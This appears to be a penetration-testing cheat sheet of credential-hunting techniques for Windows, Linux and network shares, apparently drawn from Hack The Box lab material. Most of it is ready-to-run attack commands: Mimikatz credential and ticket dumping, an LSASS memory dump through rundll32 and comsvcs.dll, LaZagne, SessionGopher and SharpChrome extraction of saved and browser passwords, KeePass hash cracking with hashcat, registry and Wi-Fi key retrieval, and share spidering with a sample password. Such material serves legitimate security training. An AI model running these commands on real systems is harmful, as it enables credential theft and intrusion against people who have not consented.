
```bash
grep -RinE "pass|pwd|key|secret|token|auth" .
find /var/www -name ".env"
```

# Windows

Keywords to search via GUI (Window Search) or CLI:

- Passwords
- Passphrases
- Keys
- Username
- User account
- Creds
- Users
- Passkeys
- configuration
- dbcredential
- dbpassword
- pwd
- Login
- Credentials

- Passwords in Group Policy in the SYSVOL share
- Passwords in scripts in the SYSVOL share
- Password in scripts on IT shares
- Passwords in `web.config` files on dev machines and IT shares
- Password in `unattend.xml`
- Passwords in the AD user or computer description fields
- KeePass databases (if we are able to guess or crack the master password)
- Found on user systems and shares
- Files with names like `pass.txt`, `passwords.docx`, `passwords.xlsx` found on user systems, shares, and [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)

### Autonomous Tools

- https://github.com/login-securite/DonPAPI

In an Active Directory environment, we can use a tool such as [Snaffler](https://github.com/SnaffCon/Snaffler) to crawl network share drives for interesting file extensions such as `.kdbx`, `.vmdk`, `.vdhx`, `.ppk`, etc.

We can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials.

```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```

When all else fails, we can run the [LaZagne](https://github.com/AlessandroZ/LaZagne) tool in an attempt to retrieve credentials from a wide variety of software. Such software includes web browsers, chat clients, databases, email, memory dumps, various sysadmin tools, and internal password storage mechanisms (i.e., Autologon, Credman, DPAPI, LSA secrets, etc.).

```powershell
.\lazagne.exe all
```

### Mimikatz

```bash
lsadump::lsa /patch
sekurlsa::logonpasswords
sekurlsa::minidump C:\Temp\final.dmp

# credential manager
sekurlsa::credman
vault::cred

# dump tickets
sekurlsa::tickets /export
```

### LSASS Dump

#### Task Manager

This requires us to:

1. Open `Task Manager`
2. Select the `Processes` tab
3. Find and right click the `Local Security Authority Process`
4. Select `Create dump file`

A file called `lsass.DMP` is created and saved in `%temp%`. This is the file we will transfer to our attack host.

#### Rundll32.exe & Comsvcs.dll method

This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line. 

It is important to note that modern anti-virus tools recognize this method as malicious activity.

Before issuing the command to create the dump file, we must determine what process ID (`PID`) is assigned to `lsass.exe`.

```powershell
# finding lsass process id
# cmd
tasklist /svc

# powershell
Get-Process lsass
```

```powershell
# dumping lsass with powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 644 C:\lsass.dmp full
```

#### Pypykatz to extract credentials

```powershell
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

### Searching for Application Config Files

```powershell
# Search File contents
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
findstr /SIM /C:"gitlab" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password

# search file extension
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*

where /R C:\ *.config

Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

### Dictionary Files (Chrome)

```powershell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

### Unattended Installation Files

- Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the `unattend.xml` are stored in plaintext or base64 encoded.

### PowerShell History File

```powershell
# confirm path
(Get-PSReadLineOption).HistorySavePath

# Read History file
gc (Get-PSReadLineOption).HistorySavePath

# Retrieves accessible PowerShell command history files for all local user profiles
# Assume the path is default one
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

### PowerShell Credentials

Finding PowerShell Credentials Files

```powershell
Get-ChildItem C:\ -Recurse -Include *.ps1 -ErrorAction SilentlyContinue |
Select-String 'Import-Clixml|Export-Clixml|Get-Credential'
```

Decrypts a DPAPI-protected PowerShell credential file to retrieve the stored username and password

```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

### Sticky Notes Passwords

We can copy the three `plum.sqlite*` files down to our system and open them with a tool such as [DB Browser for SQLite](https://sqlitebrowser.org/dl/) and view the `Text` column in the `Note` table with the query `select Text from Note;`.

```powershell
# File PATH
C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\
```

**Viewing Sticky Notes Data Using PowerShell**

- https://github.com/RamblingCookieMonster/PSSQLite

```powershell
Set-ExecutionPolicy Bypass -Scope Process
cd .\PSSQLite\
Import-Module .\PSSQLite.psd1

$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'

Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

**Strings to View DB File Contents**

```powershell
strings plum.sqlite-wal
```

### Other Interesting Files

```powershell
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

### Cmdkey Saved Credentials

```powershell
cmdkey /list

# Run Commands as Another User
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
# example
runas /savecred /user:SRV01\mcharles cmd
```

### Browser Credentials

- https://github.com/GhostPack/SharpDPAPI
- https://github.com/ohyicong/decrypt-chrome-passwords
- https://github.com/unode/firefox_decrypt

> Credential collection from Chromium-based browsers typically generates additional events that could be logged and identified by the blue team such as `4688` (process creation) and `16385` (DPAPI activity); defenders may also consider filesystem/object access events such as `4662` (object access) and `4663` (file access) to improve detection fidelity.

```powershell
.\SharpChrome.exe logins /unprotect
```

### Password Managers

Many companies provide password managers to their users. This may be in the form of a desktop application such as KeePass, a cloud-based solution such as 1Password, or an enterprise password vault such as Thycotic or CyberArk.

**Extracting KeePass Hash**

```powershell
keepass2john ILFREIGHT_Help_Desk.kdbx

hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt
```

### Email

If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool [MailSniper](https://github.com/dafthack/MailSniper).

### Clear-Text Password Storage in the Registry

#### Windows AutoLogon

The typical configuration of an Autologon account involves the manual setting of the following registry keys:

- `AutoAdminLogon` - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.
- `DefaultUserName` - Holds the value of the username of the account that will automatically log on.
- `DefaultPassword` - Holds the value of the password for the user account specified previously.

If you absolutely must configure Autologon for your windows system, it is recommended to use Autologon.exe from the Sysinternals suite, which will encrypt the password as an LSA secret.

```powershell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

#### Putty

```powershell
# Enumerating Sessions and Finding Credentials
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
# check creds
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

### Wifi Passwords

```powershell
# Viewing Saved Wireless Networks
netsh wlan show profile

# Retrieving Saved Wireless Passwords
netsh wlan show profile ilfreight_corp key=clear
```


# Linux

## Credential Hunting

```bash
grep 'DB_USER\|DB_PASSWORD' wp-config.php
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
ls ~/.ssh
```

### Searching for config files

```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# scan user or password in config files directly
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

### Searching for databases

```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

### Searching for scripts

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

### Searching for notes

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

### Enumerating log files

```bash
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

### Memory and cache

#### Automatic Tools

- https://github.com/huntergregal/mimipenguin
- https://raw.githubusercontent.com/AlessandroZ/LaZagne/refs/heads/master/Linux/laZagne.py
- https://github.com/unode/firefox_decrypt.git

```bash
# requires administrator/root permissions
sudo python3 mimipenguin.py

sudo python2.7 laZagne.py all

# Firefox browser creds
# Require python 3.9
ls -l .mozilla/firefox/ | grep default
python3.9 firefox_decrypt.py
```

# Network Traffic

- https://github.com/lgandx/PCredz.git

```bash
./Pcredz -f demo.pcapng -t -v
```

## WireShark

| Wireshark filter                                  | Description                                                                                                                                                                          |
| ------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `ip.addr == 56.48.210.13`                         | Filters packets with a specific IP address                                                                                                                                           |
| `tcp.port == 80`                                  | Filters packets by port (HTTP in this case).                                                                                                                                         |
| `http`                                            | Filters for HTTP traffic.                                                                                                                                                            |
| `dns`                                             | Filters DNS traffic, which is useful to monitor domain name resolution.                                                                                                              |
| `tcp.flags.syn == 1 && tcp.flags.ack == 0`        | Filters SYN packets (used in TCP handshakes), useful for detecting scanning or connection attempts.                                                                                  |
| `icmp`                                            | Filters ICMP packets (used for Ping), which can be useful for reconnaissance or network issues.                                                                                      |
| `http.request.method == "POST"`                   | Filters for HTTP POST requests. In the case that POST requests are sent over unencrypted HTTP, it may be the case that passwords or other sensitive information is contained within. |
| `tcp.stream eq 53`                                | Filters for a specific TCP stream. Helps track a conversation between two hosts.                                                                                                     |
| `eth.addr == 00:11:22:33:44:55`                   | Filters packets from/to a specific MAC address.                                                                                                                                      |
| `ip.src == 192.168.24.3 && ip.dst == 56.48.210.3` | Filters traffic between two specific IP addresses. Helps track communication between specific hosts.                                                                                 |

## Network Shares

### From Windows

- https://github.com/SnaffCon/Snaffler
- https://github.com/NetSPI/PowerHuntShares

```powershell
Snaffler.exe -s

Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public

findstr /S /I /M /C:"passw" "\\DC01.inlanefreight.local\IT\*.txt"
```

### Linux

- https://github.com/blacklanternsecurity/MANSPIDER.git

```bash
nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"
```